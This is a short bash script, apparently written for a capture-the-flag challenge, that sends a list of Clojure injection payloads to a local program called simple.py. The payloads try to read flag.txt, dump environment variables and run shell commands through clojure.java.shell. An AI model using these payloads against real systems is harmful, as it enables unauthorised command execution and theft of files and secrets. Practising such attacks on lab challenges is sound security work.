#!/bin/bash

echo "=== Testing various Clojure payloads ==="

payloads=(
    "(println \"hello\")"
    "(slurp \"flag.txt\")"
    "(System/getenv)"
    "(clojure.java.shell/sh \"ls\")"
    "(clojure.java.shell/sh \"cat\" \"flag.txt\")"
    "(require '[clojure.java.shell :as shell]) (shell/sh \"ls\")"
    "(use 'clojure.java.shell) (sh \"ls\")"
    "((fn [] (slurp \"flag.txt\")))"
    "(def x (slurp \"flag.txt\")) x"
    "(read-line)"
    "*command-line-args*"
    "(ns-publics *ns*)"
)

for payload in "${payloads[@]}"; do
    echo ""
    echo "Payload: $payload"
    python3 simple.py "$payload"
    sleep 0.2
done
